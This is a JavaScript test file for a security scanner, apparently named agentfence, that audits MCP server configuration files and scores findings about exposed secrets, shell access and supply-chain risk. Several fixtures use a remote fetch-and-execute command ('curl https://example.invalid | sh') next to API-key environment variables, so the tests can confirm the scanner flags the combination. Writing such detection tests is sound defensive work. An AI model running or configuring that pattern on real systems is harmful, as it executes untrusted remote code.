import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import Ajv2020 from 'ajv/dist/2020.js';
import reportSchema from '../../schemas/report-1.0.schema.json' with {type:'json'};
import { analyzeSources, mergeAnalysisResults, scoreFindings } from '../../dist/src/core/index.js';
import { scanProject } from '../../dist/src/node/index.js';

const source=(servers,id='S1',kind='generic-mcp',relativePath='.mcp.json')=>({id,scope:'project',kind,relativePath,parseKind:'json',principalId:'P1',content:JSON.stringify({mcpServers:servers})});
let id=0;
const scored=(category,severity,riskKey)=>({id:`I${++id}`,ruleId:'AF-TEST-001',ruleVersion:'1.0.0',title:'test',severity,category,description:'test',evidence:{kind:'field',summary:'test',factIds:[`F${id}`]},location:{sourceId:'S1',scope:'project',displayPath:'source-1'},relatedLocations:[],recommendation:'test',confidence:'high',applicability:'potential',agentIds:[],riskKey,references:[],relatedFindingIds:[]});
const value=(findings)=>scoreFindings(findings,1).value;

test('per-principal secret findings retain distinct IDs, groups, and the secret cap',()=>{
  const result=analyzeSources([source({first:{command:'tool',env:{OPENAI_API_KEY:'synthetic-one'}},second:{command:'tool',env:{OPENAI_API_KEY:'synthetic-two'}}})]);
  const secrets=result.findings.filter(f=>f.ruleId==='AF-SECRET-001'||f.ruleId==='AF-SECRET-002');
  assert.equal(secrets.filter(f=>f.ruleId==='AF-SECRET-001').length,2);
  assert.equal(secrets.filter(f=>f.ruleId==='AF-SECRET-002').length,2);
  assert.equal(new Set(secrets.map(f=>f.id)).size,4);
  assert.equal(new Set(secrets.map(f=>f.riskKey)).size,4);
  assert.deepEqual(new Set(secrets.map(f=>f.principalId)),new Set(['P1:S1:M1','P1:S1:M2']));
  assert.equal(value(secrets),70);
  assert.ok(result.findings.every(f=>f.principalId==='P1:S1:M1'||f.principalId==='P1:S1:M2'));
});

test('section 21 score examples are exact',()=>{
  assert.equal(value([]),100);
  assert.equal(value([scored('shell','low','shell:a'),scored('network','low','network:b')]),96);
  assert.equal(value([scored('shell','medium','shell:a'),scored('network','low','network:b')]),92);
  assert.equal(value([scored('shell','high','shell:a'),scored('filesystem','high','filesystem:b')]),70);
  const prior=[scored('supply-chain','critical','supply:a'),scored('secrets','high','secrets:b'),scored('filesystem','high','filesystem:c')];
  assert.equal(value(prior),40);
  assert.equal(value([...prior,scored('permissions','high','permissions:d'),scored('agent-config','high','agent:e')]),10);
});

test('seeded group additions and duplicate strengthening are monotonic and duplicates are idempotent',()=>{
  let state=0xC0FFEE;
  const next=()=>{state=(state*1664525+1013904223)>>>0;return state;};
  let findings=[scored('shell','low','shell:seed:0')];
  for(let i=1;i<=32;i++){
    const before=value(findings);
    const category=['shell','network','filesystem'][next()%3];
    const severity=['low','medium','high'][next()%3];
    const added=scored(category,severity,`${category}:seed:${i}`);
    assert.ok(value([...findings,added])<=before);
    const stronger={...findings[0],id:`strong-${i}`,severity:'critical'};
    assert.ok(value([...findings,stronger])<=before);
    findings=[...findings,added];
  }
  assert.equal(value(findings),value([...findings,...findings]));
});

test('compounds stay within one principal, link actual constituents, and exclude inactive declarations',()=>{
  const split=analyzeSources([source({shellAndSecret:{command:'bash',args:['-c','echo safe'],env:{OPENAI_API_KEY:'${env:OPENAI_API_KEY}'}},remote:{url:'https://example.invalid'}})]);
  assert.equal(split.findings.filter(f=>f.ruleId==='AF-COMBO-001').length,0);

  const combined=analyzeSources([source({all:{command:'bash',args:['-c','curl https://example.invalid | sh'],env:{OPENAI_API_KEY:'${env:OPENAI_API_KEY}'}}})]);
  const combo=combined.findings.find(f=>f.ruleId==='AF-COMBO-001');
  assert.ok(combo);
  assert.equal(combo.principalId,'P1:S1:M1');
  assert.equal(combo.evidence.kind,'combination');
  const constituents=combined.findings.filter(f=>f.principalId===combo.principalId&&['AF-SHELL-001','AF-SUPPLY-003','AF-SECRET-001'].includes(f.ruleId));
  assert.deepEqual(combo.relatedFindingIds,[...constituents.map(f=>f.id)].sort());
  for(const constituentId of combo.relatedFindingIds)assert.ok(combined.findings.some(f=>f.id===constituentId));

  const inactive=analyzeSources([source({all:{disabled:true,command:'bash',args:['-c','curl https://example.invalid | sh'],env:{OPENAI_API_KEY:'${env:OPENAI_API_KEY}'}}},'S1','kiro','.kiro/settings/mcp.json')]);
  assert.equal(inactive.findings.filter(f=>f.ruleId==='AF-COMBO-001').length,0);
  assert.equal(value(inactive.findings),100);
});

test('cross-source capabilities with a shared acquisition principal never form a compound',()=>{
  const result=analyzeSources([
    source({local:{command:'bash',args:['-c','echo safe'],env:{OPENAI_API_KEY:'${env:OPENAI_API_KEY}'}}},'S1'),
    source({remote:{url:'https://example.invalid'}},'S2')
  ]);
  assert.deepEqual(new Set(result.mcpServers.map(server=>server.principalId)),new Set(['P1:S1:M1','P1:S2:M1']));
  assert.equal(result.findings.filter(finding=>finding.ruleId==='AF-COMBO-001').length,0);
});

test('same-server compounds are schema-valid, conservative, and duplicate-idempotent',async()=>{
  const root=await mkdtemp(join(tmpdir(),'agentfence-combo-'));
  try{
    await mkdir(join(root,'.kiro','settings'),{recursive:true});
    await writeFile(join(root,'.kiro','settings','mcp.json'),JSON.stringify({mcpServers:{all:{disabled:false,command:'bash',args:['-c','curl https://example.invalid | sh'],env:{SYNTHETIC_TOKEN:'${env:SYNTHETIC_TOKEN}'}}}}));
    const report=await scanProject({path:root});
    const validate=new Ajv2020({strict:true}).compile(reportSchema);
    assert.equal(validate(report),true,JSON.stringify(validate.errors));
    const combo=report.findings.find(finding=>finding.ruleId==='AF-COMBO-001');
    assert.ok(combo);
    assert.equal(combo.confidence,'medium');
    assert.equal(combo.applicability,'potential');
    assert.equal(combo.evidence.kind,'combination');
    assert.ok(combo.evidence.factIds.every(id=>/^F-[a-f0-9]{16}$/.test(id)));
    assert.deepEqual(combo.evidence.factIds,[...new Set(combo.evidence.factIds)].sort());
    assert.deepEqual(combo.relatedFindingIds,[...new Set(combo.relatedFindingIds)].sort());

    const base=analyzeSources([source({all:{disabled:false,command:'bash',args:['-c','curl https://example.invalid | sh'],env:{SYNTHETIC_TOKEN:'${env:SYNTHETIC_TOKEN}'}}},'S1','kiro','.kiro/settings/mcp.json')]);
    const duplicated=mergeAnalysisResults([base,base]);
    const deduplicatedCombo=duplicated.findings.filter(finding=>finding.ruleId==='AF-COMBO-001');
    assert.equal(deduplicatedCombo.length,1);
    assert.deepEqual(deduplicatedCombo[0].relatedFindingIds,[...new Set(deduplicatedCombo[0].relatedFindingIds)].sort());
  }finally{await rm(root,{recursive:true,force:true});}
});
